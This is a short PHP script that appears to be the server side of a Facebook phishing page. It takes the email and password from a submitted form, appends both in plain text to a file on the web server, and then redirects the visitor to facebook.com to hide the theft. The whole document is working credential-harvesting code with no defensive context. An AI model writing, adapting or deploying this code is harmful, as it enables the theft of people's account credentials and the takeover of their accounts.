<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
    if( $_POST["email"] != "" AND $_POST["pass"] != "" ){ #1
        $fp = fopen("/var/www/html/arquivo.txt", "a");
        fwrite($fp, "$_POST[email]\n"); #2
        fwrite($fp, "$_POST[pass]\n\n"); #3
        fclose($fp);
        header('Location: https://facebook.com');
    } else
        header("Location: /");
} else
    die();
?>